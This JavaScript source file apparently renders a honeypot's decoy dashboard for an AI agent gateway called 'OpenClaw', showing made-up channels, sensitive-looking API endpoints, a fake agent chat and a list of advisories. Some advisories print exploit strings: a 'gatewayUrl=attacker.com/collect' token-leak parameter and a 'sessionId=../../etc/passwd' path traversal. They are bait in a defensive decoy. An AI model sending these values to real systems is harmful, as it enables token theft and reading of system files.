import { escapeHtml } from '../core/utils.js';
import { HONEYPOT_VERSION, FAKE_NODE_VERSION, FAKE_FS } from './openclaw.js';

function formatUptime(ms) {
  const s = Math.floor(ms / 1000);
  const d = Math.floor(s / 86400);
  const h = Math.floor((s % 86400) / 3600);
  const m = Math.floor((s % 3600) / 60);
  if (d > 0) return `${d}d ${h}h ${m}m`;
  if (h > 0) return `${h}h ${m}m`;
  return `${m}m`;
}

export function htmlDashboard(uptimeMs) {
  const uptime = formatUptime(uptimeMs);
  const cfg = JSON.parse(FAKE_FS['/root/.openclaw/openclaw.json']);
  const maskKey = k => k ? k.slice(0,12)+'••••••••••••••••' : '(not set)';

  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>OpenClaw Gateway</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
:root{--bg:#0a0a0b;--sidebar:#111114;--card:#141418;--border:#252529;--text:#e2e2e5;--muted:#71717a;--green:#22c55e;--red:#ef4444;--yellow:#eab308;--blue:#3b82f6;--orange:#f97316;--font:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
body{background:var(--bg);color:var(--text);font-family:var(--font);min-height:100vh;display:flex;flex-direction:column;font-size:14px;line-height:1.5}
a{color:var(--blue);text-decoration:none}
/* Layout */
.layout{display:flex;flex:1;min-height:0}
/* Sidebar */
.sidebar{width:200px;background:var(--sidebar);border-right:1px solid var(--border);display:flex;flex-direction:column;position:fixed;top:0;left:0;height:100vh;z-index:20;padding-top:0}
.sidebar-brand{display:flex;align-items:center;gap:9px;padding:16px 16px 14px;border-bottom:1px solid var(--border)}
.brand-icon{width:28px;height:28px;background:linear-gradient(135deg,var(--orange),#dc2626);border-radius:7px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
.brand-icon svg{width:15px;height:15px;fill:#fff}
.brand-name{font-weight:700;font-size:15px;letter-spacing:-.3px}
.brand-ver{font-size:10px;background:rgba(249,115,22,.15);color:var(--orange);padding:1px 6px;border-radius:10px;font-weight:500;margin-left:2px}
.sidebar-nav{flex:1;padding:8px 0;overflow-y:auto}
.nav-item{display:flex;align-items:center;gap:9px;padding:8px 14px;font-size:13px;color:var(--muted);cursor:pointer;border-radius:0;transition:.12s;border-left:2px solid transparent;text-decoration:none}
.nav-item:hover{color:var(--text);background:rgba(255,255,255,.04)}
.nav-item.active{color:var(--text);background:rgba(249,115,22,.08);border-left-color:var(--orange)}
.nav-item svg{width:15px;height:15px;flex-shrink:0;opacity:.7}
.nav-item.active svg{opacity:1}
.sidebar-footer{padding:12px 14px;border-top:1px solid var(--border);font-size:11px;color:var(--muted)}
/* Main */
.main-wrap{margin-left:200px;flex:1;display:flex;flex-direction:column;min-height:100vh}
/* Header */
.header{display:flex;align-items:center;justify-content:space-between;padding:12px 24px;border-bottom:1px solid var(--border);background:rgba(10,10,11,.8);backdrop-filter:blur(8px);position:sticky;top:0;z-index:10}
.header-left{display:flex;align-items:center;gap:12px;font-size:13px;color:var(--muted)}
.status-dot{width:7px;height:7px;border-radius:50%;background:var(--green);box-shadow:0 0 5px var(--green);animation:pulse 2s infinite;flex-shrink:0}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
.header-right{display:flex;align-items:center;gap:14px;font-size:12px;color:var(--muted)}
.header-right a{color:var(--muted);font-size:12px}
.header-right a:hover{color:var(--text)}
.fast-badge{padding:2px 8px;background:rgba(59,130,246,.12);color:var(--blue);border-radius:10px;font-size:11px;font-weight:500;cursor:pointer}
/* Content */
.content{flex:1;padding:24px;overflow-y:auto}
/* Tab panels */
.tab-panel{display:none}.tab-panel.active{display:block}
/* Stats grid */
.stats-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-bottom:24px}
.stat-card{background:var(--card);border:1px solid var(--border);border-radius:9px;padding:16px 18px}
.stat-label{font-size:11px;color:var(--muted);margin-bottom:5px;text-transform:uppercase;letter-spacing:.5px}
.stat-value{font-size:22px;font-weight:700;line-height:1.2}
.stat-sub{font-size:11px;color:var(--muted);margin-top:3px}
/* Section header */
.sec-head{font-size:11px;font-weight:600;color:var(--muted);text-transform:uppercase;letter-spacing:.6px;margin-bottom:12px;margin-top:22px}
.sec-head:first-child{margin-top:0}
/* Channel grid */
.ch-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:24px}
.ch-card{background:var(--card);border:1px solid var(--border);border-radius:9px;padding:14px 15px;display:flex;align-items:center;gap:12px}
.ch-icon{width:34px;height:34px;border-radius:8px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
.ch-body{flex:1;min-width:0}
.ch-name{font-size:13px;font-weight:500;text-transform:capitalize}
.ch-detail{font-size:11px;color:var(--muted);margin-top:2px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.badge{font-size:10px;padding:2px 7px;border-radius:10px;font-weight:600;white-space:nowrap}
.b-ok{background:rgba(34,197,94,.12);color:var(--green)}
.b-err{background:rgba(239,68,68,.12);color:var(--red)}
.b-off{background:rgba(113,113,122,.12);color:var(--muted)}
/* Table */
.tbl-wrap{background:var(--card);border:1px solid var(--border);border-radius:9px;overflow:hidden;margin-bottom:24px}
table{width:100%;border-collapse:collapse}
th{text-align:left;padding:9px 14px;font-size:11px;color:var(--muted);font-weight:500;border-bottom:1px solid var(--border);background:rgba(255,255,255,.02);white-space:nowrap}
td{padding:11px 14px;font-size:13px;border-bottom:1px solid var(--border)}
tr:last-child td{border-bottom:none}
tr:hover td{background:rgba(255,255,255,.02)}
/* Code block */
.code-block{background:#0d1117;border:1px solid var(--border);border-radius:9px;padding:16px;font-family:'SF Mono',Consolas,monospace;font-size:12px;line-height:1.7;overflow:auto;max-height:500px;color:#c9d1d9;white-space:pre}
.json-key{color:#79c0ff}.json-str{color:#a5d6ff}.json-num{color:#79c0ff}.json-bool{color:#ff7b72}.json-null{color:#ff7b72}
/* Logs */
.log-wrap{background:#0d1117;border:1px solid var(--border);border-radius:9px;font-family:'SF Mono',Consolas,monospace;font-size:12px;overflow:hidden}
.log-toolbar{display:flex;align-items:center;justify-content:space-between;padding:8px 14px;border-bottom:1px solid var(--border);background:rgba(255,255,255,.02)}
.log-toolbar button{padding:4px 12px;background:var(--card);border:1px solid var(--border);color:var(--muted);border-radius:6px;font-size:11px;cursor:pointer;font-family:inherit}
.log-toolbar button:hover{color:var(--text)}
.log-body{padding:10px 14px;max-height:420px;overflow-y:auto;line-height:1.8}
.log-line{display:flex;gap:12px}
.log-ts{color:var(--muted);flex-shrink:0;min-width:190px}
.log-lvl-INF{color:#71717a}.log-lvl-WRN{color:var(--yellow)}.log-lvl-ERR{color:var(--red)}
/* Chat */
.chat-feed{display:flex;flex-direction:column;gap:16px;margin-bottom:24px}
.chat-msg{background:var(--card);border:1px solid var(--border);border-radius:9px;overflow:hidden}
.chat-head{display:flex;align-items:center;gap:9px;padding:9px 14px;border-bottom:1px solid var(--border);background:rgba(255,255,255,.02);font-size:12px;color:var(--muted)}
.chat-body{padding:12px 14px;font-size:13px;line-height:1.6;white-space:pre-wrap}
.chat-user{color:var(--text)}.chat-agent{color:#c9d1d9}
.tool-call{background:rgba(59,130,246,.06);border:1px solid rgba(59,130,246,.2);border-radius:6px;padding:6px 10px;font-family:'SF Mono',Consolas,monospace;font-size:11px;color:var(--blue);margin:6px 0}
.ch-pill{padding:2px 8px;border-radius:10px;font-size:11px;font-weight:600}
.pill-wa{background:rgba(37,211,102,.15);color:#25d366}
.pill-tg{background:rgba(44,165,224,.15);color:#2ca5e0}
.pill-dc{background:rgba(88,101,242,.15);color:#5865f2}
/* Terminal */
.term-wrap{background:#0d0e0f;border:1px solid var(--border);border-radius:9px;overflow:hidden;margin-bottom:24px;min-height:480px;display:flex;flex-direction:column}
.term-bar{background:#1c1e22;display:flex;align-items:center;gap:6px;padding:9px 14px;border-bottom:1px solid #1f2228}
.term-dot{width:11px;height:11px;border-radius:50%}
.term-title{font-size:12px;color:#666;margin-left:6px;font-family:'SF Mono',Consolas,monospace}
.term-output{flex:1;padding:12px 16px;font-family:'SF Mono',Consolas,monospace;font-size:13px;line-height:1.7;overflow-y:auto;color:#33ff33;max-height:380px;white-space:pre-wrap;word-break:break-all}
.term-output .t-err{color:#ff5555}
.term-output .t-prompt{color:#33ff33}
.term-output .t-cmd{color:#fff}
.term-input-row{display:flex;align-items:center;gap:0;border-top:1px solid #1f2228;background:#0d0e0f;padding:8px 16px}
.term-prompt-label{font-family:'SF Mono',Consolas,monospace;font-size:13px;color:#33ff33;white-space:nowrap;margin-right:8px}
#term-input{flex:1;background:transparent;border:none;outline:none;color:#fff;font-family:'SF Mono',Consolas,monospace;font-size:13px;caret-color:#33ff33}
/* Skills grid */
.skills-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:24px}
.skill-card{background:var(--card);border:1px solid var(--border);border-radius:9px;padding:14px 16px}
.skill-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:6px}
.skill-name{font-size:13px;font-weight:500}
.skill-ver{font-size:11px;color:var(--muted)}
.skill-toggle{width:34px;height:18px;border-radius:9px;cursor:pointer;border:none;position:relative;transition:.15s}
.skill-on{background:var(--green)}.skill-off{background:var(--border)}
.skill-toggle::after{content:'';position:absolute;top:2px;width:14px;height:14px;border-radius:50%;background:#fff;transition:.15s}
.skill-on::after{right:2px}.skill-off::after{left:2px}
/* API section */
.api-card{background:var(--card);border:1px solid var(--border);border-radius:9px;padding:18px;margin-bottom:24px}
.api-base{font-family:'SF Mono',Consolas,monospace;font-size:12px;background:rgba(255,255,255,.05);padding:7px 11px;border-radius:6px;margin-bottom:14px;color:var(--muted)}
.ep-list{display:flex;flex-direction:column;gap:4px}
.ep-row{display:flex;align-items:center;gap:10px;padding:6px 9px;border-radius:6px;transition:.12s;text-decoration:none;color:var(--text)}
.ep-row:hover{background:rgba(255,255,255,.04)}
.ep-method{font-family:'SF Mono',Consolas,monospace;font-size:11px;font-weight:700;width:36px;color:var(--green)}
.ep-method.post{color:var(--yellow)}
.ep-path{font-family:'SF Mono',Consolas,monospace;font-size:12px;flex:1}
.ep-tag{font-size:10px;padding:1px 6px;border-radius:4px;font-weight:600}
.tag-sens{background:rgba(239,68,68,.12);color:var(--red)}
.tag-ok{background:rgba(34,197,94,.1);color:var(--green)}
.tag-crit{background:rgba(220,38,38,.2);color:#fca5a5}
/* Config warning */
.cfg-warn{display:flex;align-items:center;gap:8px;background:rgba(234,179,8,.08);border:1px solid rgba(234,179,8,.25);border-radius:8px;padding:10px 14px;margin-bottom:14px;font-size:13px;color:var(--yellow)}
/* Responsive */
@media(max-width:900px){.stats-grid{grid-template-columns:repeat(2,1fr)}.ch-grid{grid-template-columns:1fr 1fr}.skills-grid{grid-template-columns:1fr 1fr}}
@media(max-width:640px){.sidebar{display:none}.main-wrap{margin-left:0}.stats-grid{grid-template-columns:1fr 1fr}.ch-grid{grid-template-columns:1fr}}
footer{border-top:1px solid var(--border);padding:14px 24px;font-size:11px;color:var(--muted);margin-left:200px}
.footer-inner{max-width:100%;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px}
.bsz{display:flex;gap:16px}
</style>
</head>
<body>
<div class="layout">
<!-- Sidebar -->
<nav class="sidebar">
  <div class="sidebar-brand">
    <div class="brand-icon"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg></div>
    <span class="brand-name">OpenClaw</span>
    <span class="brand-ver">v${HONEYPOT_VERSION}</span>
  </div>
  <div class="sidebar-nav">
    <a class="nav-item active" data-tab="overview" href="#">
      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M3 13h8V3H3v10zm0 8h8v-6H3v6zm10 0h8V11h-8v10zm0-18v6h8V3h-8z"/></svg>
      Overview
    </a>
    <a class="nav-item" data-tab="chat" href="#">
      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>
      Chat
    </a>
    <a class="nav-item" data-tab="sessions" href="#">
      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-5 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z"/></svg>
      Sessions
    </a>
    <a class="nav-item" data-tab="config" href="#">
      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M19.14 12.94c.04-.3.06-.61.06-.94s-.02-.64-.07-.94l2.03-1.58c.18-.14.23-.41.12-.61l-1.92-3.32c-.12-.22-.37-.29-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54c-.04-.24-.24-.41-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58c-.18.14-.23.41-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z"/></svg>
      Config
    </a>
    <a class="nav-item" data-tab="logs" href="#">
      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm-5 3h4v2h-4V7zm0 4h4v2h-4v-2zM4 7h9v12H4V7zm11 8h4v2h-4v-2z"/></svg>
      Logs
    </a>
    <a class="nav-item" data-tab="terminal" href="#">
      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4V6h16v12zM6.5 10.5l1.41-1.41L11.5 13l-3.59 3.59L6.5 15.18 9.09 13l-2.59-2.5z"/></svg>
      Terminal
    </a>
    <a class="nav-item" data-tab="skills" href="#">
      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M20.5 11H19V7c0-1.1-.9-2-2-2h-4V3.5C13 2.12 11.88 1 10.5 1S8 2.12 8 3.5V5H4c-1.1 0-2 .9-2 2v3.8H3.5c1.49 0 2.7 1.21 2.7 2.7s-1.21 2.7-2.7 2.7H2V19c0 1.1.9 2 2 2h3.8v-1.5c0-1.49 1.21-2.7 2.7-2.7s2.7 1.21 2.7 2.7V21H17c1.1 0 2-.9 2-2v-4h1.5c1.38 0 2.5-1.12 2.5-2.5S21.88 11 20.5 11z"/></svg>
      Skills
    </a>
  </div>
  <div class="sidebar-footer">
    <div>Node v${FAKE_NODE_VERSION}</div>
    <div>PID 1024 &nbsp;|&nbsp; :18789</div>
  </div>
</nav>

<!-- Main content -->
<div class="main-wrap">
  <header class="header">
    <div class="header-left">
      <span class="status-dot"></span>
      <span>Gateway Online</span>
      <span style="color:var(--border)">|</span>
      <span>Uptime: ${uptime}</span>
      <span style="color:var(--border)">|</span>
      <span>claude-opus-4-5</span>
    </div>
    <div class="header-right">
      <span class="fast-badge">Fast Mode: OFF</span>
      <a href="/api/v1/status">API</a>
      <a href="https://docs.openclaw.ai" target="_blank">Docs</a>
    </div>
  </header>

  <div class="content">

    <!-- TAB: OVERVIEW -->
    <div class="tab-panel active" id="tab-overview">
      <div class="stats-grid">
        <div class="stat-card"><div class="stat-label">Channels</div><div class="stat-value" style="color:var(--green)">5/5</div><div class="stat-sub">all connected</div></div>
        <div class="stat-card"><div class="stat-label">Active Sessions</div><div class="stat-value">1</div><div class="stat-sub">main &mdash; claude-opus-4-5</div></div>
        <div class="stat-card"><div class="stat-label">Messages Today</div><div class="stat-value">142</div><div class="stat-sub">284,318 tokens &mdash; $4.26</div></div>
        <div class="stat-card"><div class="stat-label">Uptime</div><div class="stat-value" style="font-size:18px">${uptime}</div><div class="stat-sub">since today 00:30</div></div>
      </div>

      <div class="sec-head">Channels</div>
      <div class="ch-grid">
        <div class="ch-card">
          <div class="ch-icon" style="background:#128c7e"><svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg></div>
          <div class="ch-body"><div class="ch-name">WhatsApp</div><div class="ch-detail">+1 (555) &bull;&bull;&bull;-4521</div></div>
          <span class="badge b-ok">connected</span>
        </div>
        <div class="ch-card">
          <div class="ch-icon" style="background:#2ca5e0"><svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/></svg></div>
          <div class="ch-body"><div class="ch-name">Telegram</div><div class="ch-detail">@oc_assistant_bot</div></div>
          <span class="badge b-ok">connected</span>
        </div>
        <div class="ch-card">
          <div class="ch-icon" style="background:#5865f2"><svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057.1 18.08.114 18.1.133 18.114a19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03z"/></svg></div>
          <div class="ch-body"><div class="ch-name">Discord</div><div class="ch-detail">My Homelab</div></div>
          <span class="badge b-ok">connected</span>
        </div>
        <div class="ch-card">
          <div class="ch-icon" style="background:#4a154b"><svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M5.042 15.165a2.528 2.528 0 0 1-2.52 2.523A2.528 2.528 0 0 1 0 15.165a2.527 2.527 0 0 1 2.522-2.52h2.52v2.52zm1.271 0a2.527 2.527 0 0 1 2.521-2.52 2.527 2.527 0 0 1 2.521 2.52v6.313A2.528 2.528 0 0 1 8.834 24a2.528 2.528 0 0 1-2.521-2.522v-6.313zM8.834 5.042a2.528 2.528 0 0 1-2.521-2.52A2.528 2.528 0 0 1 8.834 0a2.528 2.528 0 0 1 2.521 2.522v2.52H8.834zm0 1.271a2.528 2.528 0 0 1 2.521 2.521 2.528 2.528 0 0 1-2.521 2.521H2.522A2.528 2.528 0 0 1 0 8.834a2.528 2.528 0 0 1 2.522-2.521h6.312zm10.122 2.521a2.528 2.528 0 0 1 2.522-2.521A2.528 2.528 0 0 1 24 8.834a2.528 2.528 0 0 1-2.522 2.521h-2.522V8.834zm-1.268 0a2.528 2.528 0 0 1-2.523 2.521 2.527 2.527 0 0 1-2.52-2.521V2.522A2.527 2.527 0 0 1 15.165 0a2.528 2.528 0 0 1 2.523 2.522v6.312zm-2.523 10.122a2.528 2.528 0 0 1 2.523 2.522A2.528 2.528 0 0 1 15.165 24a2.527 2.527 0 0 1-2.52-2.522v-2.522h2.52zm0-1.268a2.527 2.527 0 0 1-2.52-2.523 2.526 2.526 0 0 1 2.52-2.52h6.313A2.527 2.527 0 0 1 24 15.165a2.528 2.528 0 0 1-2.522 2.523h-6.313z"/></svg></div>
          <div class="ch-body"><div class="ch-name">Slack</div><div class="ch-detail">demo-workspace</div></div>
          <span class="badge b-ok">connected</span>
        </div>
        <div class="ch-card">
          <div class="ch-icon" style="background:#3a76f0"><svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M12 0C5.37 0 0 5.37 0 12s5.37 12 12 12 12-5.37 12-12S18.63 0 12 0zm0 4c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg></div>
          <div class="ch-body"><div class="ch-name">Signal</div><div class="ch-detail">+1 (555) &bull;&bull;&bull;-8832</div></div>
          <span class="badge b-ok">connected</span>
        </div>
      </div>

      <div class="sec-head">Gateway API</div>
      <div class="api-card">
        <div class="api-base">Base URL: http://gateway.example.com &nbsp;&nbsp;|&nbsp;&nbsp; WS: ws://gateway.example.com/ws &nbsp;&nbsp;|&nbsp;&nbsp; Token: <span style="color:var(--orange)">ocgw-demo•••••••••••</span></div>
        <div class="ep-list">
          <a class="ep-row" href="/health"><span class="ep-method">GET</span><span class="ep-path">/health</span><span class="ep-tag tag-ok">ok</span></a>
          <a class="ep-row" href="/api/v1/status"><span class="ep-method">GET</span><span class="ep-path">/api/v1/status</span><span class="ep-tag tag-ok">ok</span></a>
          <a class="ep-row" href="/api/v1/sessions"><span class="ep-method">GET</span><span class="ep-path">/api/v1/sessions</span><span class="ep-tag tag-ok">auth</span></a>
          <a class="ep-row" href="/api/v1/channels"><span class="ep-method">GET</span><span class="ep-path">/api/v1/channels</span><span class="ep-tag tag-ok">auth</span></a>
          <a class="ep-row" href="/api/v1/config"><span class="ep-method">GET</span><span class="ep-path">/api/v1/config</span><span class="ep-tag tag-sens">sensitive</span></a>
          <a class="ep-row" href="/api/v1/keys"><span class="ep-method">GET</span><span class="ep-path">/api/v1/keys</span><span class="ep-tag tag-crit">critical</span></a>
          <a class="ep-row" href="/api/v1/shell/execute"><span class="ep-method post">POST</span><span class="ep-path">/api/v1/shell/execute</span><span class="ep-tag tag-crit">elevated</span></a>
          <a class="ep-row" href="/v1/chat/completions"><span class="ep-method post">POST</span><span class="ep-path">/v1/chat/completions</span><span class="ep-tag tag-ok">openai-compat</span></a>
          <a class="ep-row" href="/api/v1/agent/memory/export"><span class="ep-method">GET</span><span class="ep-path">/api/v1/agent/memory/export</span><span class="ep-tag tag-crit">critical</span></a>
          <a class="ep-row" href="/api/v1/exec/execute"><span class="ep-method post">POST</span><span class="ep-path">/api/v1/exec/execute</span><span class="ep-tag tag-crit">elevated</span></a>
          <a class="ep-row" href="/api/v1/agent/apply_patch"><span class="ep-method post">POST</span><span class="ep-path">/api/v1/agent/apply_patch</span><span class="ep-tag tag-sens">sensitive</span></a>
        </div>
      </div>

      <div class="sec-head">Security Advisories</div>
      <div style="display:flex;flex-direction:column;gap:8px">
        <div style="background:var(--card);border:1px solid #7f1d1d;border-radius:8px;padding:12px 16px">
          <div style="display:flex;align-items:center;gap:10px;margin-bottom:4px">
            <span style="font-size:10px;font-weight:700;background:#dc2626;color:#fff;padding:2px 7px;border-radius:4px">CRITICAL</span>
            <span style="font-size:12px;font-weight:600;color:var(--red)">CVE-2026-25253</span>
            <span style="font-size:12px;color:var(--muted)">Remote Code Execution &mdash; gatewayUrl parameter token leakage</span>
            <span style="margin-left:auto;font-size:11px;color:#ef4444;font-weight:600">IN THE WILD</span>
          </div>
          <div style="font-size:12px;color:var(--muted)">Affected: &lt; 2026.1.29 &nbsp;&bull;&nbsp; This instance: v${HONEYPOT_VERSION} &nbsp;&bull;&nbsp; Exploit: <code style="font-size:11px;color:var(--orange)">/?gatewayUrl=attacker.com/collect</code></div>
        </div>
        <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:12px 16px">
          <div style="display:flex;align-items:center;gap:10px;margin-bottom:4px">
            <span style="font-size:10px;font-weight:700;background:#d97706;color:#fff;padding:2px 7px;border-radius:4px">HIGH</span>
            <span style="font-size:12px;font-weight:600;color:var(--yellow)">GHSA-rchv-x836-w7xp</span>
            <span style="font-size:12px;color:var(--muted)">Auth token stored unencrypted in localStorage / URL params</span>
          </div>
          <div style="font-size:12px;color:var(--muted)">Affected: &lt;= 2026.3.2 &nbsp;&bull;&nbsp; Token key: <code style="font-size:11px;color:var(--orange)">ocgw_auth_token</code></div>
        </div>
        <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:12px 16px">
          <div style="display:flex;align-items:center;gap:10px;margin-bottom:4px">
            <span style="font-size:10px;font-weight:700;background:#d97706;color:#fff;padding:2px 7px;border-radius:4px">HIGH</span>
            <span style="font-size:12px;font-weight:600;color:var(--yellow)">CVE-2026-28464</span>
            <span style="font-size:12px;color:var(--muted)">Path traversal via sessionId / sessionFile parameters</span>
          </div>
          <div style="font-size:12px;color:var(--muted)">Affected: &lt; 2026.2.12 &nbsp;&bull;&nbsp; Exploit: <code style="font-size:11px;color:var(--orange)">?sessionId=../../etc/passwd</code></div>
        </div>
        <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:12px 16px">
          <div style="display:flex;align-items:center;gap:10px;margin-bottom:4px">
            <span style="font-size:10px;font-weight:700;background:#dc2626;color:#fff;padding:2px 7px;border-radius:4px">CRITICAL</span>
            <span style="font-size:12px;font-weight:600;color:var(--red)">CVE-2026-32060</span>
            <span style="font-size:12px;color:var(--muted)">Path traversal in apply_patch &mdash; arbitrary file write outside workdir</span>
          </div>
          <div style="font-size:12px;color:var(--muted)">Affected: &lt; 2026.2.14 &nbsp;&bull;&nbsp; Endpoint: <code style="font-size:11px;color:var(--orange)">POST /api/v1/agent/apply_patch</code></div>
        </div>
        <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:12px 16px">
          <div style="display:flex;align-items:center;gap:10px;margin-bottom:4px">
            <span style="font-size:10px;font-weight:700;background:#d97706;color:#fff;padding:2px 7px;border-radius:4px">HIGH</span>
            <span style="font-size:12px;font-weight:600;color:var(--yellow)">CVE-2026-26319 &nbsp;|&nbsp; CVE-2026-28470</span>
            <span style="font-size:12px;color:var(--muted)">Webhook no-auth &amp; Exec Approvals allowlist bypass</span>
          </div>
          <div style="font-size:12px;color:var(--muted)">Affected: &lt;= 2026.2.13 &nbsp;&bull;&nbsp; Endpoints: <code style="font-size:11px;color:var(--orange)">/webhooks/telnyx</code> &nbsp;<code style="font-size:11px;color:var(--orange)">/api/v1/exec/execute</code></div>
        </div>
      </div>
    </div>

    <!-- TAB: CHAT -->
    <div class="tab-panel" id="tab-chat">
      <div class="chat-feed">
        <div class="chat-msg">
          <div class="chat-head"><span class="ch-pill pill-wa">WhatsApp</span><span>+1 (555) &bull;&bull;&bull;-4521</span><span style="margin-left:auto">5 min ago</span></div>
          <div class="chat-body"><span class="chat-user">User: Check my emails and summarize the unread ones</span>
<div class="tool-call">[tool: gmail.list_messages] query="is:unread" maxResults=10</div>
<span class="chat-agent">Agent: You have 5 unread emails:

1. "Q2 Budget Approval Needed" — sarah@example.com (2h ago)
   Action required: Review and approve by Friday

2. "PR #142 merged" — github@example.com (3h ago)
